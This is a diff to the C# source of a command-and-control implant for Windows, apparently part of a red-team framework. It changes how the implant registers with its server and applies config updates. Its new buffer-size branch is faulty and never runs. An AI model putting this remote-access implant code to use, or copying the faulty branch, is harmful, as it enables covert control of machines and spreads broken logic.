@@ -18,12 +18,12 @@ namespace NuagesSharpImplant
         private Dictionary<string, string> config;
         private string hostname;
         private string username;
+        private string type = "SharpImplant";
         private string localIp;
         private string os;
         private string handler;
         private string connectionString;
         private NuagesC2Connector connector;
-        private Dictionary<string, string> options;
         private Dictionary<string, Assembly> assemblies;
         String[] supportedPayloads;
         JArray jobs;
@@ -51,6 +51,7 @@ namespace NuagesSharpImplant
             this.connector = connector;
 
             this.assemblies = new Dictionary<string, Assembly>();
+
 
             try
             {
@@ -83,6 +84,8 @@ namespace NuagesSharpImplant
 
             this.os = "windows";
 
+            this.type = "SharpImplant";
+
             this.connectionString = connector.getConnectionString();
 
             this.supportedPayloads = new string[10];
@@ -108,8 +111,6 @@ namespace NuagesSharpImplant
             this.supportedPayloads[9] = "tcp_fwd";
 
             this.handler = connector.getHandler();
-
-            this.options = new Dictionary<string, string>();
         }
 
         public void Register()
@@ -117,7 +118,7 @@ namespace NuagesSharpImplant
             while (!this.config.ContainsKey("id"))
             {
                 try {
-                    this.config["id"] = connector.RegisterImplant(hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, options: this.options, supportedPayloads: this.supportedPayloads);
+                    this.config["id"] = connector.RegisterImplant(type: this.type, hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, config: this.config, supportedPayloads: this.supportedPayloads);
                     System.Threading.Thread.Sleep(1000 * Int32.Parse(this.config["sleep"]));
                 }
                 catch (Exception e){
@@ -225,7 +226,20 @@ namespace NuagesSharpImplant
                     foreach (var x in config)
                     {
                         this.config[x.Key] = x.Value.ToString();
+                        if (x.Key == "refreshrate")
+                        {
+                            this.connector.setRefreshRate(int.Parse(x.Value.ToString()));
+                        }
+                        else if (x.Key == "buffersize") {
+
+                            if (x.Key == "refreshrate")
+                            {
+                                this.connector.setBufferSize(int.Parse(x.Value.ToString()));
+                            }
+
+                        }
                     }
+
                     SubmitJobResult(jobId, Newtonsoft.Json.JsonConvert.SerializeObject(this.config), false);
                 }
                 else if (jobType == "exit")
